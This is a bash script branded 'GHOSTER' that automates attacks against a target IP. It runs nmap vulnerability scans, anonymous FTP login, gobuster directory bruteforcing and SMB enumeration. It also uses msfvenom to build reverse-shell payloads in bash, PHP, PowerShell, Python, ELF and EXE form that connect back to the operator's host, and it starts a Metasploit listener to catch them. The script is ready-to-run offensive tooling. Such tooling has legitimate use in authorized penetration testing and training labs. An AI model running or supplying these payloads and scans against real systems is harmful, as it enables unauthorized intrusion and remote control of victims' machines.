#!/bin/bash
BBlu='\e[1;34m';

Full_Scan () {
    echo "Please enter the port to scan!"
    read ip
    dire="$ip"
    mkdir $dire
    
    while true; do
        echo -e "Scan for vulnerabilities? Y/N"
        read yn
        case $yn in
            [Yy]* ) echo -e "}Scanning ip!";nmap -A -T4 --script vuln $ip > "$dire/nmap.txt";break;;
            [Nn]* ) echo -e "Scanning ip!";nmap -A -T4 $ip > "$dire/nmap.txt";break;;
            * ) echo -e "Please answer yes or no.";;
        esac
    done
    
    
    
    if grep -q 'Anonymous FTP login allowed' "$dire/nmap.txt"; then
        echo -e "Listing ftp files!"
        loginftp $ip
    fi
    
    if grep -q '80/tcp' "$dire/nmap.txt"; then
        echo -e "\nPerforming directory bruteforce for webserver!"
        gobuster dir -u "http://$ip" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt >  "$dire/gobuster.txt"
    fi
    
    if grep -q '8080/tcp' "$dire/nmap.txt"; then
        echo -e "\nPerforming directory bruteforce for webserver!"
        gobuster dir -u "http://$ip:8080" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt >  "$dire/gobuster.txt"
    fi
    
    if grep -q '445/tcp' "$dire/nmap.txt" ||grep -q '139/tcp' "$dire/nmap.txt"; then
        echo -e "\nTrying SMB Map!"
        smbmap -H $ip > $dire/smb.txt
        grep -v "Working on it" $dire/smb.txt > $dire/temp && mv $dire/temp $dire/smb.txt
        echo -e "Trying enum4linux!"
        enum4linux $ip > $dire/enum4linux.txt 2> /dev/null
        grep -v "*unknown*" $dire/enum4linux.txt > $dire/temp && mv $dire/temp $dire/enum4linux.txt
    fi
    
    echo -e "Results can be found in $dire"
    exit
}

Start_Listener () {
    ip=$1
    port=$2
    payload=$3
    
    msfconsole -q -x "use exploit/multi/handler;set payload $payload;set LHOST $ip;set LPORT $port;exploit"
    return
}


Reverse_Shell () {
    echo "Please enter your ip!"
    read ip
    echo "Please enter the port to use!"
    read port
    
    echo -e "\nChoose an extension!"
    echo -e "  1)Bash"
    echo -e "  2)PHP"
    echo -e "  3)Powershell"
    echo -e "  4)Python"
    echo -e "  5)Linux"
    echo -e "  6)Windows"
    echo -e "  7)Exit"
    read n
    case $n in
        1) msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > shell.sh;echo -e "\nPayload generated, starting metasploit listener!";Start_Listener $ip $port "cmd/unix/reverse_bash";;
        2) msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > shell.php;echo -e "\nPayload generated, starting metasploit listener!";Start_Listener $ip $port "php/meterpreter_reverse_tcp";;
        3) msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f psh -o meterpreter-64.ps1;echo -e "\nPayload generated, starting metasploit listener!";Start_Listener $ip $port "windows/x64/meterpreter/reverse_tcp";;
        4) msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > shell.py -f raw > shell.php;echo -e "\nPayload generated, starting metasploit listener!";Start_Listener $ip $port "cmd/unix/reverse_python";;
        5) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > shell.elf;echo -e "\nPayload generated, starting metasploit listener!";Start_Listener $ip $port "linux/x86/meterpreter/reverse_tcp ";;
        6) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe;echo -e "\nPayload generated, starting metasploit listener!";Start_Listener $ip $port "windows/meterpreter/reverse_tcp";;
        7) exit;;
        *) echo "invalid option";;
    esac
}


loginftp () {
    USER='anonymous'
    PASSWD='anonymous'
    
ftp -n $1<<END_SCRIPT
quote USER $USER
quote PASS $PASSWD
ls -la ftp.txt
get ftp.txt
quit
END_SCRIPT
    mv ftp.txt $dire
}


menu () {
    echo -e "${BBlu}

░██████╗░██╗░░██╗░█████╗░░██████╗████████╗███████╗██████╗░
██╔════╝░██║░░██║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██║░░██╗░███████║██║░░██║╚█████╗░░░░██║░░░█████╗░░██████╔╝
██║░░╚██╗██╔══██║██║░░██║░╚═══██╗░░░██║░░░██╔══╝░░██╔══██╗
╚██████╔╝██║░░██║╚█████╔╝██████╔╝░░░██║░░░███████╗██║░░██║
░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
    "
}

menu
echo -e "  1)Scan an ip"
echo -e "  2)Generate reverse shell"
echo -e "  3)Exit"

read n
case $n in
    1) Full_Scan;;
    2) Reverse_Shell;;
    3) exit;;
    *) echo "invalid option";;
esac
